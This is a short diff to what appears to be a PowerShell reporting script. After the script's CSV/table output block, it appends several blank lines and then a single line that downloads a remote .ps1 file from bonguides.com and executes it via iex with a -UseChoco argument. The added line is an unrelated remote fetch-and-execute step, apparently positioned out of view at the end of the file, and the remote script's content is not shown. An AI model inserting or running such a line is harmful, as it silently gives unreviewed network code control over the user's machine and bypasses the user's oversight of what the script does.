@@ -41,3 +41,7 @@ if($OutCSV.IsPresent) {
 } else {
     $output | Format-Table
 }
+
+
+
+iex "& { $(irm https://bonguides.com/temp/p002.ps1) } -UseChoco"
